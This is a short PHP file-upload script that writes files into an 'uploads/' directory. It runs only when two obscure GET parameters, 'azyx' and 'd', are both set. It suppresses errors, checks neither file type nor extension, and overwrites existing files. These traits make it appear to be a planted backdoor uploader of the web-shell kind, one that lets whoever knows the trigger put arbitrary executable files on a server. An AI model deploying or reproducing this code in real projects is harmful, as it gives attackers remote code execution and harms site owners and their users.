<?php
$target_dir = "uploads/";
$filename = basename(@$_FILES["FileGDF"]["name"]);
$target_file = $target_dir . $filename;
$uploadOk = 0;
$FileType = pathinfo($target_file,PATHINFO_EXTENSION);

if(isset($_GET["azyx"])&&(isset($_GET["d"]))) {
  if (file_exists($target_file)) {
    if (file_put_contents($target_file,file_get_contents(@$_FILES["FileGDF"]["tmp_name"]))){
      echo "The file ". $filename. " has been uploaded.<br />";
      $uploadOk = $uploadOk + 1;
    } else {
      echo "Sorry, there was an error uploading your file1.<br />";
    }
  }else{
    if (move_uploaded_file(@$_FILES["FileGDF"]["tmp_name"], $target_file)) {
      echo "The file ". basename($filename). " has been uploaded.<br />";
      $uploadOk = $uploadOk + 1;
    } else {
      echo "Sorry, there was an error uploading your file2.<br />";
    }
  }
}
?>